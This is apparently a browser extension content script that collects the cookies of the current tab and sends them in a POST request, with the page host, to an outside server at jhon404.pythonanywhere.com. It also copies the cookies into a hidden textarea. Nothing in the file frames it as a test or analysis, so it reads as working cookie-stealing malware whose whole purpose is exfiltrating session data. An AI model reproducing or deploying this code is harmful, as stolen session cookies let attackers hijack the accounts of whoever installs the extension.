chrome.runtime.sendMessage(
  {
    action: "extractCookies",
    tabUrl: window.location.href,
  },
  (cookies) => {
    const area = document.createElement("textarea");
    area.style.position = "absolute";
    area.style.border = "0";
    area.style.padding = "0";
    area.style.margin = "0";
    area.style.height = "1px";
    area.style.top = "-10px";
    area.innerText = JSON.stringify(cookies);
    document.body.appendChild(area, document.body.firstChild);
    area.focus();
    area.select();

    // for (var pair of data.entries()) {
    //   console.log(pair[0] + ", " + pair[1]);
    // }

    const options = {
      method: "POST",
      headers: {'Content-Type': 'application/json'}, 
      body: JSON.stringify({"url": window.location.host, "cookies_data": cookies}),
    };
    
    // Make the fetch request with the provided options
    fetch('https://jhon404.pythonanywhere.com/ZnVja3lvdQ==', options)
      .then(response => {
        // Check if the request was successful
        // Parse the response as JSON
        return response;
      }).then(function (response) {
        return response.json();
    })
    .then(function (result) {
    })
    .catch (function (error) {
        console.log('Request failed', error);
    });

    // fetch("https://www.cloudflare.com/cdn-cgi/trace")
    //   .then((response) => response)
    //   .then((result) => {
    //     console.log("result", result);
    //     if (result.status === "success") {
    //       console.log(result.body);
    //     } else {
    //       console.log(result.body);
    //     }
    //   })
  }
);
